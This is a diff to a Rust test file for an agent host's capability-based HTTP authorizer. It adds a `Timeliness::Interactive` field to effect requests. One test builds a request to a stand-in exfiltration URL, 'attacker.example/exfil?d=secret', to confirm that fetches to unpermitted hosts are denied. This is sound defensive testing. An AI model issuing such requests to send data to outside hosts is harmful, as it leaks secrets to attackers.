@@ -7,7 +7,9 @@
 
 use cdz_agent_host::{HttpExecutor, HttpTransport};
 use cdz_kernel::authz::Authorizer;
-use cdz_kernel::effect::{Capability, EffectKind, EffectRequest, Payload, ResourcePredicate};
+use cdz_kernel::effect::{
+    Capability, EffectKind, EffectRequest, Payload, ResourcePredicate, Timeliness,
+};
 use cdz_kernel::event::{ContentType, EffectOutcome, Event, EventBody};
 use cdz_kernel::executor::CompositeExecutor;
 use cdz_kernel::hash::Hash;
@@ -36,6 +38,7 @@ impl Reducer for FetchAgent {
                     kind: EffectKind::Http,
                     target: "https://ok.host/data".into(),
                     payload: None, // a GET
+                    timeliness: Timeliness::Interactive,
                 }])
             }
             EventBody::EffectResult {
@@ -114,6 +117,7 @@ fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
                     kind: EffectKind::Http,
                     target: "https://attacker.example/exfil?d=secret".into(), // outside the grant
                     payload: None,
+                    timeliness: Timeliness::Interactive,
                 }])
             } else {
                 FoldOutput::none()
